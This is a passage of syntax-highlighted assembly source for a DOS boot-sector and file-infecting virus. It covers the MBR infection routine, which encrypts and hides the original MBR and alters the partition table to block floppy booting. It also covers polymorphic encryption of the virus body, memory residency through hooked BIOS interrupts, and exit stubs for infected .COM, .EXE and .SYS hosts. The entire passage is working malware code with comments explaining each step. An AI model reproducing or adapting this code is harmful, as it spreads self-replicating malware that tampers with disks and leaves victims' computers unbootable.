                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">go_memory</span><span class="sc0">

</span><span class="sc5">partition_type_ok</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Check if enougth sectors before partition</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc5">inf_sect_size</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">        
                </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">go_memory</span><span class="sc0">

                </span><span class="sc1">;Crypt original mbr</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt_sector</span><span class="sc0">

                </span><span class="sc1">;Write original mbr for stealth</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0301h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">go_memory</span><span class="sc0">

                </span><span class="sc1">;Restore sector</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">crypt_sector</span><span class="sc0">

                </span><span class="sc1">;By using this trick the computer cant be booted</span><span class="sc0">
                </span><span class="sc1">;from a system floppy</span><span class="sc0">

                </span><span class="sc1">;Set partition type as extended dos partition</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc2">05h</span><span class="sc0">

                </span><span class="sc1">;Disable partition and set head to 00h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Set partition starting at cilinder 00h sector 01h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Save position of virus body in hd</span><span class="sc0">
                </span><span class="sc1">;(side 00h track 00h sector 04h)</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">load_cx</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc1">;Get position of code into mbr</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_position</span><span class="sc0">

                </span><span class="sc1">;Move virus loader over boot sector code</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">boot_code</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">boot_size</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc1">;Write infected mbr</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">hd_write_port</span><span class="sc0">

                </span><span class="sc1">;Save exit address</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exit_address</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;This will tell the virus that this is a mbr infection</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exit_address</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_mbr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
                                                   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_ret</span><span class="sc0">

                </span><span class="sc1">;Clear dos running switch</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">running_sw</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;Clear dos loaded flag</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">dos_flag</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;Clear file infection flag</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_infection_flag</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

                </span><span class="sc1">;Reset virus timer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">virus_timer</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Set delta offset for mbr poly engine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_delta</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">7E00h</span><span class="sc0">

                </span><span class="sc1">;Save pointer to polymorphic engine working buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_working_off</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">poly_working_seg</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc1">;Perform encryption</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_encrypt</span><span class="sc0">

                </span><span class="sc1">;Write virus body</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0300h</span><span class="sc4">+</span><span class="sc5">inf_sect_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc1">;Restore exit address</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exit_address</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Go memory resident if running from mbr or floppy boot sector              ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">go_memory</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Running from hd mbr or floppy bs?</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exit_address</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_mbr</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
                                                   </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_ret</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">running_in_file</span><span class="sc0">

                </span><span class="sc1">;Allocate some bios memory</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0413h</span><span class="sc4">],</span><span class="sc5">mem_kb_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0413h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Copy virus to allocated memory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">inf_byte_size</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc1">;Hook ints</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc1">;Get int 12h vector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_int</span><span class="sc0">

                </span><span class="sc1">;Save old int 12h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old12h_off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old12h_seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc1">;Hook int 12h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_int12h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">

                </span><span class="sc1">;Get int 13h vector</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_int</span><span class="sc0">

                </span><span class="sc1">;Save old int 13h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old13h_off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old13h_seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc1">;Hook int 13h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_int13h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">

                </span><span class="sc1">;Get int 1Ch vector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Ch</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_int</span><span class="sc0">

                </span><span class="sc1">;Save old int 1Ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old1Ch_off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old1Ch_seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc1">;Hook int 1Ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">my_int1Ch</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_int</span><span class="sc0">

                </span><span class="sc1">;Get int 40h vector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_int</span><span class="sc0">

                </span><span class="sc1">;Save old int 40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old40h_off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">old40h_seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">running_in_file</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Return to boot sequence</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">control_back</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Exit from infected hd mbr or floppy boot sector                           ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">exit_mbr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Get .sys parameter block pointer out of stack</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc1">;Restore segment registers</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc1">;Reboot system</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">19h</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Exit from .sys infected files                                             ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">exit_sys</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Point to old .sys header ( offset of strategy routine address )</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">old_header</span><span class="sc4">+</span><span class="sc2">0006h</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0006h</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lodsw</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc1">;Get .sys parameter block pointer</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc1">;Restore segment registers</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc1">;Get control back to strategy subroutine</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Clear some regs</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Exit from .com infected files                                             ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">exit_com</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Restore first three bytes</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">old_header</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc1">;Get .sys parameter block pointer</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc1">;Restore segment registers</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc1">;Get control back to host</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">

                </span><span class="sc1">;Clear some regs</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Exit from .exe infected files                                             ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">exit_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Get .sys parameter block pointer              </span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc1">;Restore segment registers</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc1">;Get active psp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">62h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exe_cs</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc1">;Restore stack</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_header</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_header</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">

                </span><span class="sc1">;Clear some regs</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
